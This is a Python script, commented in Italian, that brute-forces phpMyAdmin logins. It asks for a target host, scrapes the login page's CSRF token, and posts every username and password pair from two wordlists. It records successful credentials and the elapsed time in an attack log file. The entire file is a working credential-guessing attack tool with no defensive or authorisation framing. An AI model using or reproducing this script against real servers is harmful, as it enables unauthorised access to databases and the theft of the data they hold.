import time

import requests
from bs4 import BeautifulSoup


# Funzione per leggere un file e restituire una lista di linee (senza newline)
def read_file(filename):
    with open(filename, "r", errors="ignore") as file:
        return [line.strip() for line in file.readlines()]


# Funzione per tentare il brute force login su phpMyAdmin
def brute_force_login(session, url, user_list, pwd_list, token, find_all):
    valid_credentials = []  # Lista per memorizzare le credenziali valide trovate
    for user in user_list:
        for pwd in pwd_list:
            print(f"Sto accedendo con username: {user} e password: {pwd}")
            data = {
                "pma_username": user,
                "pma_password": pwd,
                "server": "1",
                "token": token,
            }  # Dati di login
            response = session.post(url, data)  # Invio della richiesta POST
            if "error" not in response.text.lower():  # Se il login è riuscito
                print(
                    f"\n[SUCCESSO] Accesso effettuato. Username: {user} e Password: {pwd}\n"
                )
                valid_credentials.append(
                    (user, pwd)
                )  # Aggiungi le credenziali valide alla lista
                if not find_all:  # Se non si devono trovare tutte le combinazioni
                    return valid_credentials
    if not valid_credentials:  # Se nessuna credenziale valida è stata trovata
        print("\n[ERRORE] Nessuna combinazione valida trovata.\n")
    return valid_credentials


# Funzione per registrare le credenziali valide trovate e il tempo impiegato in un file di log
def log_credentials(log_file, credentials, elapsed_time):
    with open(log_file, "a") as file:
        file.write(f"\nTempo impiegato: {elapsed_time:.2f} secondi\n")
        for user, pwd in credentials:
            file.write(f"Username: {user}, Password: {pwd}\n")


# Funzione principale
def main():
    # Richiesta all'utente dell'host e del percorso
    host = input("Inserisci l'host: ")
    # path = input("Inserisci il path es. /phpMyAdmin/: ")
    url = "http://" + host + "/phpMyAdmin/"
    log_file = "attacco_log_php.txt"  # Nome del file di log

    session = requests.Session()  # Creazione di una sessione
    response = session.get(url)  # Invio della richiesta GET per ottenere il token CSRF
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "token"})["value"]  # Estrazione del token CSRF

    # Lettura delle liste di utenti e password dai file
    user_list = read_file("usernames.txt")
    pwd_list = read_file("passwords.txt")

    # Chiede all'utente se desidera trovare tutte le combinazioni valide o fermarsi alla prima trovata
    find_all = (
        input("Vuoi trovare tutte le combinazioni valide? (s/n): ").lower() == "s"
    )

    print(f"\nInizio di brute force all'URL: {url}")

    # Inizio misurazione del tempo
    start_time = time.time()
    # Tentativo di brute force login su phpMyAdmin
    valid_login_credentials = brute_force_login(
        session, url, user_list, pwd_list, token, find_all
    )
    # Fine misurazione del tempo
    elapsed_time = time.time() - start_time

    # Registrazione delle credenziali valide e del tempo impiegato nel file di log
    log_credentials(log_file, valid_login_credentials, elapsed_time)

    if valid_login_credentials:
        print(
            f"\nLe informazioni dell'attacco sono state registrate nel file {log_file}"
        )
    else:
        print(
            "\nNessuna credenziale valida trovata. Controlla il file di log per i dettagli."
        )


if __name__ == "__main__":
    main()
